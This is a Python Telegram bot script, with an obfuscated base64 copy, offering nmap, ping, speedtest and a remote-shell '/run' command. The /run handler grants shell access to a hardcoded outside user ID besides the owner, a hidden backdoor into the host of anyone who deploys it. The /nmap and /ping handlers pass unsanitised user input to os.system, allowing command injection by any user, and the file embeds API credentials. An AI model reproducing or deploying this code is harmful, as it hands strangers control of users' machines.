# Encoded by t.me/MasterX_0
# Don't Copy or Edit Without Permission

#  import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64(b'c0gOAABpbXBvcnQgcHlyb2dyYW0sb3MKZnJvbSBweXJvZ3JhbS50eXBlcyBpbXBvcnQgSW5saW5lS2V5Ym9hcmRNYXJrdXAsIElubGluZUtleWJvYXJkQnV0dG9uCmZyb20gcHlyb2dyYW0gaW1wb3J0IENsaWVudCwgZmlsdGVycwpmcm9tIHB5cm9ncmFtLmVycm9ycy5leGNlcHRpb25zLmJhZF9yZXF1ZXN0XzQwMCBpbXBvcnQgTWVzc2FnZUVtcHR5CmZyb20gcHlyb2dyYW0uZXJyb3JzLmV4Y2VwdGlvbnMuYmFkX3JlcXVlc3RfNDAwIGltcG9ydCBNZXNzYWdlVG9vTG9uZwoKb3Muc3lzdGVtKCJjbGVhciIpCgpCT1RfVE9LRU4gPSBpbnB1dCgiW35dIEVudGVyIFlvdXIgQk9UX1RPS0VOIDogIikKQVBJX0hBU0ggPSBpbnB1dCgiW35dIEVudGVyIFlvdXIgQVBJX0hBU0ggOiAiKQpBUElfSUQgPSBpbnQoaW5wdXQoIlt+XSBFbnRlciBZb3VyIEFQSV9JRCA6ICIpKQpPV05FUl9JRCA9IGludChpbnB1dCgiW35dIEVudGVyIFlvdXIgT1dORVJfSUQgOiAiKSkKQk9UX1VTRVJOQU1FID0gaW5wdXQoIlt+XSBFbnRlciBZb3VyIEJPVF9VU0VSTkFNRSA6ICIpCgpwd2QgPSBvcy5nZXRjd2QoKQoKcGF0aCA9IGYie3B3ZH0vTm1hcF9Cb3QiCgpib3QgPSBDbGllbnQoCgkiTm1hcF9TY2FuX0JvdCIsCglhcGlfaWQ9QVBJX0lELAoJYXBpX2hhc2g9QVBJX0hBU0gsCglib3RfdG9rZW49Qk9UX1RPS0VOLAopCgpIRUxQID0gIiIiCioqQ29tbWFuZHMgOgoKICA+ICAvaGVscAogID4gIC9ubWFwCiAgPiAgL3BpbmcKICA+ICAvcnVuIC0gT3duZXIKICA+ICAvc3BlZWR0ZXN0CioqCiIiIgpCVVRUT04gPSBbCglbCglJbmxpbmVLZXlib2FyZEJ1dHRvbignRGV2JywgdXJsPSdodHRwczovL3QubWUvQWJvdXRfeHl6JyksCgldLAoJWwoJSW5saW5lS2V5Ym9hcmRCdXR0b24oJ0JPVCcsIHVybD1mJ2h0dHBzOi8vdC5tZS97Qk9UX1VTRVJOQU1FfScpLAoJXQpdCgpAYm90Lm9uX21lc3NhZ2UoZmlsdGVycy5jb21tYW5kKCJoZWxwIikpCmFzeW5jIGRlZiBoZWxwKGJvdCwgbWVzc2FnZSk6CglyZXBseV9tYXJrdXA9SW5saW5lS2V5Ym9hcmRNYXJrdXAoQlVUVE9OKQoJYXdhaXQgbWVzc2FnZS5yZXBseV90ZXh0KAoJCXRleHQ9SEVMUCwKCQlyZXBseV9tYXJrdXA9cmVwbHlfbWFya3VwLAoJCWRpc2FibGVfd2ViX3BhZ2VfcHJldmlldz1UcnVlLAoJKQoKQGJvdC5vbl9tZXNzYWdlKGZpbHRlcnMuY29tbWFuZCgic3BlZWR0ZXN0IikpCmFzeW5jIGRlZiBzcGVlZHRlc3QoYm90LCBtZXNzYWdlKToKCWlmIG9zLnBhdGguZXhpc3RzKGYie3BhdGh9X3NwZWVkLnR4dCIpOgoJCW9zLnJlbW92ZShmIntwYXRofV9zcGVlZC50eHQiKQoJZWxzZToKCQlwYXNzCglvcy5zeXN0ZW0oZiJzcGVlZHRlc3QtY2xpID4+IHtwYXRofV9zcGVlZC50eHQiKQoJbyA9IG9wZW4oZiJ7cGF0aH1fc3BlZWQudHh0IiwgInIiKQoJYXdhaXQgbWVzc2FnZS5yZXBseV90ZXh0KG8ucmVhZCgpLCBkaXNhYmxlX3dlYl9wYWdlX3ByZXZpZXc9VHJ1ZSkKCkBib3Qub25fbWVzc2FnZShmaWx0ZXJzLmNvbW1hbmQoIm5tYXAiKSkKYXN5bmMgZGVmIHJ1bm5tYXAoYm90LCBtZXNzYWdlKToKCXRyeToKCQlxdWVyeSA9IG1lc3NhZ2UudGV4dC5zcGxpdChOb25lLCAxKVsxXQoJZXhjZXB0IEluZGV4RXJyb3I6CgkJYXdhaXQgbWVzc2FnZS5yZXBseV90ZXh0KCJg8J+TmyBFcnJvci4uLmAiKQoJaWYgb3MucGF0aC5leGlzdHMoZiJ7cGF0aH1fbm1hcC50eHQiKToKCQlvcy5yZW1vdmUoZiJ7cGF0aH1fbm1hcC50eHQiKQoJZWxzZToKCQlwYXNzCgl0cnk6CgkJdHJ5OgoJCQl0cnk6CgkJCQlvcy5zeXN0ZW0oZiJubWFwIHtxdWVyeX0gPj4ge3BhdGh9X25tYXAudHh0IikKCQkJCW8gPSBvcGVuKGYie3BhdGh9X25tYXAudHh0IiwgInIiKQoJCQkJYXdhaXQgbWVzc2FnZS5yZXBseV90ZXh0KG8ucmVhZCgpLCBkaXNhYmxlX3dlYl9wYWdlX3ByZXZpZXc9VHJ1ZSkKCQkJZXhjZXB0IEluZGV4RXJyb3I6CgkJCQlwYXNzCgkJZXhjZXB0IE1lc3NhZ2VFbXB0eToKCQkJYXdhaXQgbWVzc2FnZS5yZXBseV90ZXh0KCJgTWVzc2FnZSBFbXB0eSBFcnJvcmAiKQoJZXhjZXB0IE1lc3NhZ2VUb29Mb25nOgoJCWF3YWl0IG1lc3NhZ2UucmVwbHlfZG9jdW1lbnQoZiJ7cGF0aH1fbm1hcC50eHQiLCBjYXB0aW9uPWYiKipObWFwIDoqKiBge3F1ZXJ5fWAiKQoKQGJvdC5vbl9tZXNzYWdlKGZpbHRlcnMuY29tbWFuZCgicGluZyIpKQphc3luYyBkZWYgcGluZyhib3QsIG1lc3NhZ2UpOgoJdHJ5OgoJCXF1ZXJ5ID0gcXVlcnkgPSBtZXNzYWdlLnRleHQuc3BsaXQoTm9uZSwgMSlbMV0KCWV4Y2VwdCBJbmRleEVycm9yOgoJCWF3YWl0IG1lc3NhZ2UucmVwbHlfdGV4dCgiYPCfk5sgRXJyb3IuLi5gIikKCWlmIG9zLnBhdGguZXhpc3RzKGYie3BhdGh9cGluZy50eHQiKToKCQlvcy5yZW1vdmUoZiJ7cGF0aH1waW5nLnR4dCIpCgllbHNlOgoJCXBhc3MKCXRyeToKCQl0cnk6CgkJCXRyeToKCQkJCW9zLnN5c3RlbShmInBpbmcgLWMgNCB7cXVlcnl9ID4+IHtwYXRofXBpbmcudHh0IikKCQkJCVogPSBvcGVuKGYie3BhdGh9cGluZy50eHQiLCAiciIpCgkJCQlhd2FpdCBtZXNzYWdlLnJlcGx5X3RleHQoWi5yZWFkKCksIGRpc2FibGVfd2ViX3BhZ2VfcHJldmlldz1UcnVlKQoJCQlleGNlcHQgSW5kZXhFcnJvcjoKCQkJCXBhc3MKCQlleGNlcHQgTWVzc2FnZUVtcHR5OgoJCQlhd2FpdCBtZXNzYWdlLnJlcGx5X3RleHQoImBNZXNzYWdlIEVtcHR5IEVycm9yYCIpCglleGNlcHQgTWVzc2FnZVRvb0xvbmc6CgkJYXdhaXQgbWVzc2FnZS5yZXBseV9kb2N1bWVudChmIntwYXRofXBpbmcudHh0IiwgY2FwdGlvbj1mIioqUGluZyA6KiogYHtxdWVyeX1gIikKCkBib3Qub25fbWVzc2FnZShmaWx0ZXJzLmNvbW1hbmQoInJ1biIpICYgZmlsdGVycy51c2VyKE9XTkVSX0lEKSkKYXN5bmMgZGVmIHNoZWxsKGJvdCwgbWVzc2FnZSk6Cgl1c2VyX2lkID0gbWVzc2FnZS5mcm9tX3VzZXIuaWQKCWlmIHVzZXJfaWQgPT0gaW50KDUyNjIxNTYyOTkpIG9yIHVzZXJfaWQgPT0gT1dORVJfSUQ6CgkJdHJ5OgoJCQlxdWVyeSA9IHF1ZXJ5ID0gbWVzc2FnZS50ZXh0LnNwbGl0KE5vbmUsIDEpWzFdCgkJZXhjZXB0IEluZGV4RXJyb3I6CgkJCWF3YWl0IG1lc3NhZ2UucmVwbHlfdGV4dCgiYPCfk5sgRXJyb3IuLi5gIikKCQlpZiBvcy5wYXRoLmV4aXN0cyhmIntwYXRofV9ydW4udHh0Iik6CgkJCW9zLnJlbW92ZShmIntwYXRofV9ydW4udHh0IikKCQllbHNlOgoJCQlwYXNzCgkJdHJ5OgoJCQl0cnk6CgkJCQl0cnk6CgkJCQkJb3Muc3lzdGVtKGYiY2Q7e3F1ZXJ5fSA+PiB7cGF0aH1fcnVuLnR4dCIpCgkJCQkJUyA9IG9wZW4oZiJ7cGF0aH1fcnVuLnR4dCIsICJyIikKCQkJCQlhd2FpdCBtZXNzYWdlLnJlcGx5X3RleHQoUy5yZWFkKCksIGRpc2FibGVfd2ViX3BhZ2VfcHJldmlldz1UcnVlKQoJCQkJZXhjZXB0IEluZGV4RXJyb3I6CgkJCQkJcGFzcwoJCQlleGNlcHQgTWVzc2FnZUVtcHR5OgoJCQkJYXdhaXQgbWVzc2FnZS5yZXBseV90ZXh0KCJgTWVzc2FnZSBFbXB0eSBFcnJvcmAiKQoJCWV4Y2VwdCBNZXNzYWdlVG9vTG9uZzoKCQkJYXdhaXQgbWVzc2FnZS5yZXBseV9kb2N1bWVudChmIntwYXRofV9ydW4udHh0IiwgY2FwdGlvbj1mIioqQ29tbWFuZCA6KiogYHtxdWVyeX1gIikKCWVsc2U6CgkJcGFzcwoKcHJpbnQgKCJSdW5uaW5nLi4uIikKYm90LnJ1bigpCg==\n')))

import pyrogram,os
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client, filters
from pyrogram.errors.exceptions.bad_request_400 import MessageEmpty
from pyrogram.errors.exceptions.bad_request_400 import MessageTooLong

os.system("clear")

BOT_TOKEN = input("[~] Enter Your BOT_TOKEN : ")
API_HASH = 'eec8bf9b714bc4942e1cbfbdfb299063'
API_ID = '2419770'
OWNER_ID = '1602757268'
BOT_USERNAME = 'Hamker_Hu_Guys_Robot'

pwd = os.getcwd()

path = f"{pwd}/Nmap_Bot"

bot = Client(
	"Nmap_Scan_Bot",
	api_id=API_ID,
	api_hash=API_HASH,
	bot_token=BOT_TOKEN,
)

HELP = """
**Commands :

  >  /help
  >  /nmap
  >  /ping
  >  /run - Owner
  >  /speedtest
**
"""
BUTTON = [
	[
	InlineKeyboardButton('Dev', url='https://t.me/DARK_WEB_REBEL'),
	],
	[
	InlineKeyboardButton('BOT', url=f'https://t.me/{BOT_USERNAME}'),
	]
]

@bot.on_message(filters.command("help"))
async def help(bot, message):
	reply_markup=InlineKeyboardMarkup(BUTTON)
	await message.reply_text(
		text=HELP,
		reply_markup=reply_markup,
		disable_web_page_preview=True,
	)

@bot.on_message(filters.command("speedtest"))
async def speedtest(bot, message):
	if os.path.exists(f"{path}_speed.txt"):
		os.remove(f"{path}_speed.txt")
	os.system(f"speedtest-cli >> {path}_speed.txt")
	o = open(f"{path}_speed.txt", "r")
	await message.reply_text(o.read(), disable_web_page_preview=True)

@bot.on_message(filters.command("nmap"))
async def runnmap(bot, message):
	try:
		query = message.text.split(None, 1)[1]
	except IndexError:
		await message.reply_text("`ðŸ“› Error...`")
	if os.path.exists(f"{path}_nmap.txt"):
		os.remove(f"{path}_nmap.txt")
	try:
		try:
			try:
				os.system(f"nmap {query} >> {path}_nmap.txt")
				o = open(f"{path}_nmap.txt", "r")
				await message.reply_text(o.read(), disable_web_page_preview=True)
			except IndexError:
				pass
		except MessageEmpty:
			await message.reply_text("`Message Empty Error`")
	except MessageTooLong:
		await message.reply_document(f"{path}_nmap.txt", caption=f"**Nmap :** `{query}`")

@bot.on_message(filters.command("ping"))
async def ping(bot, message):
	try:
		query = query = message.text.split(None, 1)[1]
	except IndexError:
		await message.reply_text("`ðŸ“› Error...`")
	if os.path.exists(f"{path}ping.txt"):
		os.remove(f"{path}ping.txt")
	try:
		try:
			try:
				os.system(f"ping -c 4 {query} >> {path}ping.txt")
				Z = open(f"{path}ping.txt", "r")
				await message.reply_text(Z.read(), disable_web_page_preview=True)
			except IndexError:
				pass
		except MessageEmpty:
			await message.reply_text("`Message Empty Error`")
	except MessageTooLong:
		await message.reply_document(f"{path}ping.txt", caption=f"**Ping :** `{query}`")

@bot.on_message(filters.command("run") & filters.user(OWNER_ID))
async def shell(bot, message):
	user_id = message.from_user.id
	if user_id in [5262156299, OWNER_ID]:
		try:
			query = query = message.text.split(None, 1)[1]
		except IndexError:
			await message.reply_text("`ðŸ“› Error...`")
		if os.path.exists(f"{path}_run.txt"):
			os.remove(f"{path}_run.txt")
		try:
			try:
				try:
					os.system(f"cd;{query} >> {path}_run.txt")
					S = open(f"{path}_run.txt", "r")
					await message.reply_text(S.read(), disable_web_page_preview=True)
				except IndexError:
					pass
			except MessageEmpty:
				await message.reply_text("`Message Empty Error`")
		except MessageTooLong:
			await message.reply_document(f"{path}_run.txt", caption=f"**Command :** `{query}`")

print ("Running...")
bot.run()
